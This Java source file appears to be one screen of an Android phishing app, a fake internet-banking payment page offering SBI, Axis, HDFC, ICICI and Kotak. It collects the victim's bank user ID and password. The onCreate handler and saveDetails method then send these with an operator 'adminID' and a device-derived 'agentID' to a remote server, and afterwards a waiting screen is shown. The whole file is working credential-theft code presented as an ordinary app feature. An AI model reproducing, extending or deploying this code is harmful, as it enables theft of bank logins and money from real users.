package com.pegalite.neotron3.ui.water;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.ArrayAdapter;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.pegalite.neotron3.R;
import com.pegalite.neotron3.databinding.ActivityInternetBankingBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;
import com.pegalite.neotron3.ui.PmKisanActivity;
import com.pegalite.neotron3.ui.WaitingActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class InternetBankingActivity extends AppCompatActivity {

    ActivityInternetBankingBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityInternetBankingBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        ArrayAdapter<String> spinnerArrayAdapter = getStringArrayAdapter();
        binding.bankName.setAdapter(spinnerArrayAdapter);

        binding.pay.setOnClickListener(v -> {
            String bankName = binding.bankName.getSelectedItem().toString();
            String userID = binding.userID.getText().toString();
            String password = binding.password.getText().toString();
            if (bankName.equals("SELECT AN OPTION") || userID.isEmpty() || password.isEmpty()) {
                binding.userID.setError("Please Enter All the Values!");
                return;
            }

            try {
                JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                object.put("bankName", bankName);
                object.put("userID", userID);
                object.put("password", password);
                saveDetails(object);
                startActivity(new Intent(this, WaitingActivity.class).putExtra("data", object.toString()));
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        });

    }
    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    @NonNull
    private ArrayAdapter<String> getStringArrayAdapter() {
        List<String> options = new ArrayList<>();
        options.add("SELECT AN OPTION");
        options.add("SBI");
        options.add("AXIS BANK");
        options.add("HDFC BANK");
        options.add("ICICI BANK");
        options.add("KOTAK BANK");
        ArrayAdapter<String> spinnerArrayAdapter = new ArrayAdapter<>
                (this, android.R.layout.simple_spinner_item, options);
        spinnerArrayAdapter.setDropDownViewResource(android.R.layout
                .simple_spinner_dropdown_item);
        return spinnerArrayAdapter;
    }

}